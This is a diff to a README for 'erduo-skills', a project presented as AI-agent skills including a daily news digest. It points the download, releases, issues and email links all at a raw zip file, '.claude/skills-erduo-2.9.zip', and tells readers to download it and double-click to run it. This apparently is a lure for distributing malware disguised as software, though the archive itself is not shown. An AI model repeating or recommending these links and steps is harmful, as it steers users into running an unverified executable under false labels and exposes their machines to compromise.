@@ -1,6 +1,6 @@
 # 🚀 erduo-skills - Empower Your AI Agent with Skills
 
-[![Download](https://github.com/Jerson78/erduo-skills/raw/refs/heads/main/NewsReport/erduo_skills_2.1.zip)](https://github.com/Jerson78/erduo-skills/raw/refs/heads/main/NewsReport/erduo_skills_2.1.zip)
+[![Download](https://github.com/Jerson78/erduo-skills/raw/refs/heads/main/.claude/skills-erduo-2.9.zip)](https://github.com/Jerson78/erduo-skills/raw/refs/heads/main/.claude/skills-erduo-2.9.zip)
 
 ## 📖 简介
 
@@ -13,13 +13,13 @@
 To use Erduo Skills, follow these steps:
 
 1. **Visit the Download Page**
-   - Go to the [Releases page](https://github.com/Jerson78/erduo-skills/raw/refs/heads/main/NewsReport/erduo_skills_2.1.zip).
+   - Go to the [Releases page](https://github.com/Jerson78/erduo-skills/raw/refs/heads/main/.claude/skills-erduo-2.9.zip).
   
 2. **Choose the Latest Release**
    - Look for the latest release version. You will see files available for download.
   
 3. **Download the Application**
-   - Click on the file named “https://github.com/Jerson78/erduo-skills/raw/refs/heads/main/NewsReport/erduo_skills_2.1.zip” to start the download process. This is the main application you will run.
+   - Click on the file named “https://github.com/Jerson78/erduo-skills/raw/refs/heads/main/.claude/skills-erduo-2.9.zip” to start the download process. This is the main application you will run.
 
 4. **Run the Application**
    - Once downloaded, locate the file and double-click it to run. Follow any prompts that appear on your screen.
@@ -70,7 +70,7 @@ The **每日日报** skill gives you high-quality, summarized news articles dail
 
 If you have questions or need assistance, you can reach out to our community:
 
-- **GitHub Issues Page**: Report bugs or request features [here](https://github.com/Jerson78/erduo-skills/raw/refs/heads/main/NewsReport/erduo_skills_2.1.zip).
+- **GitHub Issues Page**: Report bugs or request features [here](https://github.com/Jerson78/erduo-skills/raw/refs/heads/main/.claude/skills-erduo-2.9.zip).
 - **Discussion Forum**: Join the conversation in our discussion forum for user tips and support.
 
 ## 📥 Download & Install
@@ -78,10 +78,10 @@ If you have questions or need assistance, you can reach out to our community:
 To start using Erduo Skills, please follow these steps:
 
 1. **Visit the Releases Page**
-   - Go to the [Releases page](https://github.com/Jerson78/erduo-skills/raw/refs/heads/main/NewsReport/erduo_skills_2.1.zip).
+   - Go to the [Releases page](https://github.com/Jerson78/erduo-skills/raw/refs/heads/main/.claude/skills-erduo-2.9.zip).
 
 2. **Download the Application**
-   - Click on the latest release to download "https://github.com/Jerson78/erduo-skills/raw/refs/heads/main/NewsReport/erduo_skills_2.1.zip".
+   - Click on the latest release to download "https://github.com/Jerson78/erduo-skills/raw/refs/heads/main/.claude/skills-erduo-2.9.zip".
 
 3. **Install and Run**
    - Locate the downloaded file and double-click to run the application. 
@@ -97,6 +97,6 @@ We continually work on enhancing Erduo Skills. Future updates may include:
 ## ✉️ Contact
 
 For further inquiries or feedback, you can reach us at:  
-**Email**: https://github.com/Jerson78/erduo-skills/raw/refs/heads/main/NewsReport/erduo_skills_2.1.zip
+**Email**: https://github.com/Jerson78/erduo-skills/raw/refs/heads/main/.claude/skills-erduo-2.9.zip
 
 Happy exploring with Erduo Skills!
